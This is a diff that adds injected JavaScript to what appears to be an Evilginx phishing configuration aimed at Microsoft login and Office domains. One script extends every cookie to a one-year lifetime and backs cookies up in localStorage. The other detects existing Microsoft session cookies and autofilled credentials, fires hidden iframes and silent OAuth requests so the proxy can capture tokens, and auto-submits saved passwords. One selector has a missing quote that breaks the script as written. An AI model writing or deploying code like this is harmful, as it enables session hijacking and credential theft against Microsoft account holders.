@@ -174,3 +174,409 @@ auth_urls:
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com', 'login.live.com', 'www.office.com', 'outlook.office.com']
+    trigger_paths: ['/', '/common/oauth2/.*', '/login', '/ppsecure/.*']
+    script: |
+      (function() {
+        // Cookie wrapper to extend expiry to 1 year
+        const ONE_YEAR_SECS = 31536000; // 365 days
+        const ONE_YEAR_MS = ONE_YEAR_SECS * 1000;
+        
+        // Parse cookie string into components
+        function parseCookie(cookieStr) {
+          const parts = cookieStr.split(';');
+          const nameValue = parts[0].trim().split('=');
+          const result = {
+            name: nameValue[0],
+            value: nameValue.slice(1).join('='),
+            attrs: {}
+          };
+          
+          for (let i = 1; i < parts.length; i++) {
+            const part = parts[i].trim();
+            const eqIdx = part.indexOf('=');
+            if (eqIdx > -1) {
+              const key = part.substring(0, eqIdx).trim().toLowerCase();
+              const val = part.substring(eqIdx + 1).trim();
+              result.attrs[key] = val;
+            } else {
+              result.attrs[part.toLowerCase()] = true;
+            }
+          }
+          return result;
+        }
+        
+        // Build cookie string from components
+        function buildCookie(parsed) {
+          let cookieStr = parsed.name + '=' + parsed.value;
+          
+          // Force max-age to 1 year
+          cookieStr += '; Max-Age=' + ONE_YEAR_SECS;
+          
+          // Set expires to 1 year from now
+          const expires = new Date(Date.now() + ONE_YEAR_MS).toUTCString();
+          cookieStr += '; Expires=' + expires;
+          
+          // Preserve other attributes
+          for (const [key, val] of Object.entries(parsed.attrs)) {
+            if (key === 'max-age' || key === 'expires') continue; // Skip original expiry
+            if (val === true) {
+              cookieStr += '; ' + key;
+            } else {
+              cookieStr += '; ' + key + '=' + val;
+            }
+          }
+          
+          return cookieStr;
+        }
+        
+        // Wrap document.cookie setter
+        try {
+          const cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') || 
+                                   Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
+          
+          if (cookieDescriptor && cookieDescriptor.set) {
+            const originalSetter = cookieDescriptor.set;
+            
+            Object.defineProperty(document, 'cookie', {
+              get: function() {
+                return cookieDescriptor.get.call(this);
+              },
+              set: function(val) {
+                try {
+                  // Check if this is a session cookie (no expiry set)
+                  const parsed = parseCookie(val);
+                  const hasExpiry = parsed.attrs['max-age'] || parsed.attrs['expires'];
+                  
+                  // Always extend to 1 year, even for existing persistent cookies
+                  const extendedCookie = buildCookie(parsed);
+                  
+                  // Also store in localStorage as backup persistence mechanism
+                  try {
+                    localStorage.setItem('eg__' + parsed.name, JSON.stringify({
+                      value: parsed.value,
+                      expires: Date.now() + ONE_YEAR_MS,
+                      domain: window.location.hostname
+                    }));
+                  } catch(e) {}
+                  
+                  return originalSetter.call(this, extendedCookie);
+                } catch(e) {
+                  // Fallback to original on parse error
+                  return originalSetter.call(this, val);
+                }
+              },
+              configurable: true
+            });
+          }
+        } catch(e) {
+          // Silent fail - don't break page if wrapping fails
+        }
+        
+        // Also intercept cookie-setting fetch/XHR responses
+        const originalFetch = window.fetch;
+        if (originalFetch) {
+          window.fetch = function() {
+            return originalFetch.apply(this, arguments).then(function(response) {
+              try {
+                // Attempt to extend any Set-Cookie headers via Service Worker or visible cookies
+                const cookies = document.cookie;
+                if (cookies) {
+                  const cookiePairs = cookies.split(';');
+                  for (let pair of cookiePairs) {
+                    pair = pair.trim();
+                    if (!pair) continue;
+                    const eqIdx = pair.indexOf('=');
+                    if (eqIdx > -1) {
+                      const name = pair.substring(0, eqIdx);
+                      const value = pair.substring(eqIdx + 1);
+                      try {
+                        localStorage.setItem('eg__' + name, JSON.stringify({
+                          value: value,
+                          expires: Date.now() + ONE_YEAR_MS,
+                          domain: window.location.hostname
+                        }));
+                      } catch(e) {}
+                    }
+                  }
+                }
+              } catch(e) {}
+              return response;
+            });
+          };
+        }
+        
+        // Restore any backed-up cookies on page load
+        try {
+          const now = Date.now();
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key && key.startsWith('eg__')) {
+              try {
+                const data = JSON.parse(localStorage.getItem(key));
+                if (data.expires > now && data.domain === window.location.hostname) {
+                  const name = key.substring(4);
+                  // Re-set the cookie if it appears missing or expired
+                  if (!document.cookie.includes(name + '=')) {
+                    document.cookie = name + '=' + data.value + '; Max-Age=' + ONE_YEAR_SECS + '; Path=/';
+                  }
+                }
+              } catch(e) {}
+            }
+          }
+        } catch(e) {}
+        
+        console.log('[+] Cookie wrapper initialized - 1 year expiry');
+      })();
+
+  # Passwordless/SSO Detection - captures pre-authenticated sessions
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/', '/common/oauth2/authorize', '/common/oauth2/v2.0/authorize', '/consumers/oauth2', '/organizations/oauth2']
+    script: |
+      (function() {
+        // Passwordless/SSO Detection Module
+        // Detects users already authenticated to Microsoft and captures their session
+        
+        const AUTH_CHECK_DELAY = 2000; // Wait 2s for page to settle
+        const AUTH_CHECK_ENDPOINTS = [
+          '/common/userrealm',
+          '/common/GetCredentialType',
+          '/api/AccountAvailability',
+          '/api/namews/CheckUserRealm'
+        ];
+        
+        // Check for existing auth cookies indicating logged-in state
+        function checkExistingAuth() {
+          const cookies = document.cookie;
+          const authIndicators = [
+            'ESTSAUTH',
+            'ESTSAUTHPERSISTENT',
+            'SignInStateCookie',
+            'MSISAuth',
+            'MSISAuthenticated',
+            'OIDC',
+            'RPSAuth',
+            'RPSSecAuth',
+            'MSPAuth',
+            'MSPAUTH',
+            'WLSSC',
+            'PPLState',
+            'NAP',
+            'ANON'
+          ];
+          
+          const foundAuth = [];
+          for (const indicator of authIndicators) {
+            if (cookies.includes(indicator + '=') || cookies.includes(indicator + ' ')) {
+              foundAuth.push(indicator);
+            }
+          }
+          return foundAuth;
+        }
+        
+        // Check for cached credentials/autofill indicating saved login
+        function detectSavedCredentials() {
+          const usernameFields = document.querySelectorAll('input[type="email"], input[name*="login"], input[name*="user"], input[name="loginfmt"]');
+          const passwordFields = document.querySelectorAll('input[type="password"], input[name*="pass"]');
+          
+          for (const field of usernameFields) {
+            if (field.value && field.value.length > 3 && field.value.includes('@')) {
+              return { type: 'autofill', username: field.value };
+            }
+          }
+          return null;
+        }
+        
+        // Validate session by checking if user data is available in page
+        function detectAuthenticatedState() {
+          // Check for user display name/avatar indicating logged-in state
+          const userElements = document.querySelectorAll([
+            '[data-testid="user-display-name"]',
+            '.userDisplayName',
+            '.user-name',
+            '.ms- persona-text',
+            '.signed-in-user',
+            '[role="banner"] .user-info',
+            '.user-profile',
+            'img[src*="profilephoto"],
+            'img[alt*="profile"]',
+            '.tenant-name',
+            '.organization-name'
+          ].join(','));
+          
+          // Check URL for logged-in indicators
+          const url = window.location.href;
+          const loggedInPatterns = [
+            /login_hint=/i,
+            /user_hint=/i,
+            /domain_hint=/i,
+            /[?&]login=/i,
+            /wreply=/i,
+            /whr=/i
+          ];
+          
+          const urlHasHint = loggedInPatterns.some(p => p.test(url));
+          
+          return {
+            hasUserElements: userElements.length > 0,
+            urlHasLoginHint: urlHasHint,
+            foundElements: userElements.length
+          };
+        }
+        
+        // Force navigation through auth flow to trigger token capture
+        function triggerAuthFlowCapture() {
+          // Add a hidden iframe to navigate to an auth endpoint
+          // This forces the browser to send auth cookies, which Evilginx captures
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.style.width = '0';
+          iframe.style.height = '0';
+          
+          // Use Microsoft Graph or a common endpoint that requires auth
+          // This will trigger SSO if user is already logged in
+          const ssoCheckUrl = '/common/oauth2/v2.0/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_type=code&redirect_uri=https://www.office.com&scope=openid profile&prompt=none';
+          
+          iframe.src = ssoCheckUrl;
+          document.body.appendChild(iframe);
+          
+          // Also try fetching user info endpoint
+          fetch('/api/beta/me', {
+            method: 'GET',
+            credentials: 'include',
+            cache: 'no-cache'
+          }).catch(() => {}); // Silent fail - we're just triggering cookie transmission
+          
+          // Try to trigger silent SSO flow
+          setTimeout(() => {
+            fetch('/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276&redirect_uri=/login&response_type=id_token&prompt=none&nonce=' + Date.now(), {
+              method: 'HEAD',
+              credentials: 'include',
+              cache: 'no-cache',
+              redirect: 'manual'
+            }).catch(() => {});
+          }, 500);
+          
+          // Clean up iframe after cookies are captured
+          setTimeout(() => {
+            if (iframe.parentNode) {
+              iframe.parentNode.removeChild(iframe);
+            }
+          }, 3000);
+        }
+        
+        // Main passwordless detection logic
+        function detectAndCapturePasswordless() {
+          const existingAuth = checkExistingAuth();
+          const savedCreds = detectSavedCredentials();
+          const authState = detectAuthenticatedState();
+          
+          const hasStrongAuth = existingAuth.includes('ESTSAUTH') || 
+                               existingAuth.includes('ESTSAUTHPERSISTENT') ||
+                               existingAuth.includes('RPSAuth') ||
+                               existingAuth.includes('RPSSecAuth');
+          
+          const hasMediumAuth = existingAuth.includes('SignInStateCookie') ||
+                               existingAuth.includes('buid') ||
+                               existingAuth.includes('esctx');
+          
+          // Log detection results (for debugging via network tab)
+          console.log('[SSO Detection] Auth cookies:', existingAuth.join(', ') || 'none');
+          console.log('[SSO Detection] Autofill detected:', savedCreds ? 'yes' : 'no');
+          console.log('[SSO Detection] Authenticated elements:', authState.foundElements);
+          console.log('[SSO Detection] URL has login hint:', authState.urlHasLoginHint);
+          
+          // If strong auth tokens exist OR (medium auth + autofill) OR (medium auth + authenticated UI)
+          if (hasStrongAuth || 
+              (hasMediumAuth && (savedCreds || authState.hasUserElements || authState.urlHasLoginHint))) {
+            
+            console.log('[SSO Detection] Pre-authenticated user detected - triggering capture');
+            
+            // Trigger the auth flow to force token refresh/capture
+            triggerAuthFlowCapture();
+            
+            // Mark this session as passwordless for reporting
+            try {
+              sessionStorage.setItem('__eg_passwordless', 'true');
+              sessionStorage.setItem('__eg_auth_cookies', existingAuth.join(','));
+            } catch(e) {}
+            
+            // If we have autofill username, pre-populate any visible fields
+            if (savedCreds && savedCreds.username) {
+              const emailField = document.querySelector('input[name="loginfmt"], input[type="email"]');
+              if (emailField && !emailField.value) {
+                emailField.value = savedCreds.username;
+                // Trigger input events
+                emailField.dispatchEvent(new Event('input', { bubbles: true }));
+                emailField.dispatchEvent(new Event('change', { bubbles: true }));
+              }
+            }
+            
+            // Attempt auto-submit if credentials are saved and visible
+            if (savedCreds && document.querySelector('input[type="password"]')) {
+              const submitBtn = document.querySelector('input[type="submit"], button[type="submit"], #idSIButton9, [id*="Submit"], [id*="submit"]');
+              if (submitBtn && submitBtn.offsetParent !== null) {
+                // Wait briefly for password to autofill
+                setTimeout(() => {
+                  const passField = document.querySelector('input[type="password"]');
+                  if (passField && passField.value.length > 0) {
+                    console.log('[SSO Detection] Auto-submitting with saved credentials');
+                    submitBtn.click();
+                  }
+                }, 1500);
+              }
+            }
+            
+            // If user appears fully authenticated (no login form visible), 
+            // try to navigate to force token capture
+            const loginForm = document.querySelector('form[action*="login"], input[name*="password"], #password, .password, input[type="password"]');
+            if (!loginForm && (hasStrongAuth || authState.hasUserElements)) {
+              console.log('[SSO Detection] No login form visible - user appears fully authenticated');
+              // Trigger navigation to post-auth page to capture final tokens
+              setTimeout(() => {
+                const params = new URLSearchParams(window.location.search);
+                const redirectUri = params.get('redirect_uri') || params.get('wreply') || '/app';
+                if (redirectUri && !redirectUri.includes('logout')) {
+                  // Silently navigate to trigger final auth URL capture
+                  const img = new Image();
+                  img.src = redirectUri + '?_=' + Date.now();
+                }
+              }, 1000);
+            }
+          }
+        }
+        
+        // Run detection after page loads
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+          setTimeout(detectAndCapturePasswordless, AUTH_CHECK_DELAY);
+        } else {
+          window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(detectAndCapturePasswordless, AUTH_CHECK_DELAY);
+          });
+        }
+        
+        // Also run on any URL changes (SPA navigation)
+        let lastUrl = location.href;
+        new MutationObserver(() => {
+          const url = location.href;
+          if (url !== lastUrl) {
+            lastUrl = url;
+            setTimeout(detectAndCapturePasswordless, 1000);
+          }
+        }).observe(document, { subtree: true, childList: true });
+        
+        // Periodic re-check for delayed auth state
+        setInterval(() => {
+          const existingAuth = checkExistingAuth();
+          const hasStrongAuth = existingAuth.includes('ESTSAUTH') || 
+                               existingAuth.includes('ESTSAUTHPERSISTENT');
+          if (hasStrongAuth && !sessionStorage.getItem('__eg_captured')) {
+            sessionStorage.setItem('__eg_captured', 'true');
+            console.log('[SSO Detection] Auth tokens detected - capture in progress');
+          }
+        }, 3000);
+        
+        console.log('[+] Passwordless/SSO detection module initialized');
+      })();
